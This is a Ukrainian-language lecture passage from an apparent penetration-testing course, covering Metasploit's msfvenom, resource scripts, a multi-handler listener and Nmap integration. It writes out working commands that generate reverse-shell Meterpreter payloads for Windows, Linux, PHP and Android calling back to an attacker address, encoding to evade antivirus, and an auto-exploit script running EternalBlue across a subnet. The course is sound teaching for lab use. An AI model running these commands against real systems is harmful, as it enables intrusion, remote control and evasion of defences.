msfvenom — генерація пейлоадів

msfvenom = msfpayload + msfencode — уніфікований інструмент з MSF 5. Генерує standalone пейлоади для будь-якої платформи з кодуванням для обходу AV.
# Windows reverse shell EXE msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe # Linux ELF msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf # PHP web shell msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php # Android APK msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o app.apk # З кодуванням (обхід AV) msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=10.0.0.1 LPORT=4444 -f exe -o encoded.exe
Формат Платформа Формат Платформа
exe Windows elf Linux
apk Android war Java (Tomcat)
raw Сирі байти python Python скрипт
powershell PowerShell c C shellcode
vba Office макрос asp/aspx IIS Web

Resource Scripts — автоматизація

.rc файли — скрипти з командами msfconsole для автоматизації рутинних задач (масове сканування, автоексплоїт, налаштування хендлерів).
# auto_exploit.rc use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 192.168.1.0/24 set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.0.0.1 run # Запуск: msfconsole -r auto_exploit.rc # Або всередині msfconsole: resource auto_exploit.rc # Збереження виконаних команд у .rc файл: makerc /tmp/session_commands.rc

Приклад: Multi-handler

# handler.rc use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 set LPORT 4444 exploit -j -z

Запускає handler у фоні для прийому з'єднань

Інші методи автоматизації

  • AutoPwn — застарілий модуль (db_autopwn), видалений з MSF 5
  • Альтернативи: Metasploit Pro (комерційний), custom Ruby скрипти, інтеграція з Python (pymetasploit3)

Інтеграція з іншими інструментами

Nmap інтеграція

# Скан з автоматичним імпортом у БД db_nmap -sV -O 192.168.1.0/24 # Перегляд імпортованих даних hosts services # Пошук вразливих хостів vulns -p 445 -S ms17 # Автоматичний вибір експлоїтів db_autopwn -t -p -e # застарілий

Результати Nmap автоматично імпортуються в БД Metasploit. Можна відразу шукати вразливості за портом/сервісом.

Інші інструменти

  • Cobalt Strike — комерційний C2 фреймворк (team collaboration, beacon payloads, malleable profiles)
  • Empire / Starkiller — PowerShell post-exploitation framework (Windows-орієнтований)
  • Covenant — .NET C2 фреймворк (аналог Empire для .NET)
  • Veil — AV evasion framework (генерація пейлоадів з обходом антивірусів)
Відповідальне використання! Інтеграція інструментів підвищує ефективність, але й збільшує потенційну шкоду. Використовуйте тільки в легальних сценаріях (pentest контракт, red team exercise, навчальні лабораторії).

Підсумок лекції 5

Metasploit Framework — це не просто колекція експлоїтів. Це комплексна екосистема для всього циклу пентесту: від розвідки (db_nmap) до експлуатації та post-exploitation (Meterpreter).

Ключові теми лекції:

Архітектура MSF: модулі, міксіни, REX, бібліотека експлоїтів
Типи модулів: exploits, payloads, auxiliary, post, encoders, nops, evasion
msfconsole: workspace, БД, пошук (search), використання модулів
Експлоїти: single vs staged, bind vs reverse, exploit + payload
Meterpreter: API, міграція, persistence, pivoting, post-модулі
Evading AV: кодування, обфускація, polymorphic shellcode
Pivoting: routes, autoroute, portfwd, socks proxy
Автоматизація: msfvenom, .rc скрипти, інтеграція з Nmap

Далі: Лекція 6 — Брутфорс та атаки на паролі

Вивчимо атаки на аутентифікацію: словникові атаки, rainbow tables, онлайн vs офлайн брутфорс, Hydra, John the Ripper, Hashcat.

Від експлуатації вразливостей — до зламу облікових записів!

Практика: налаштуйте власну лабораторію (Metasploitable 3, HackTheBox, VulnHub VMs) і пройдіть цикл: db_nmap → search → exploit → meterpreter → post → pivoting.
